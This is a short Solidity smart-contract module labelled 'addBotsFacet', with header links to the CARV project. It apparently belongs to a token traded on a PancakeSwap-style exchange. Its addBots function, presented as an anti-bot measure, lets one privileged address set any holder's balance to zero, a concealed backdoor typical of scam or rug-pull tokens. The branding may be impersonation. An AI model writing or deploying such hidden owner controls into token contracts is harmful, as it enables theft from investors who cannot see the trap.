/*
 * SPDX-License-Identifier: MIT
 * Website: https://carv.io/home
 * X: https://twitter.com/carv_official
 * Telegram: https://t.me/carv_official_global
 * Youtube: https://www.youtube.com/channel/UCU9MzSdeEKLYUXnM6SfXFTQ
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
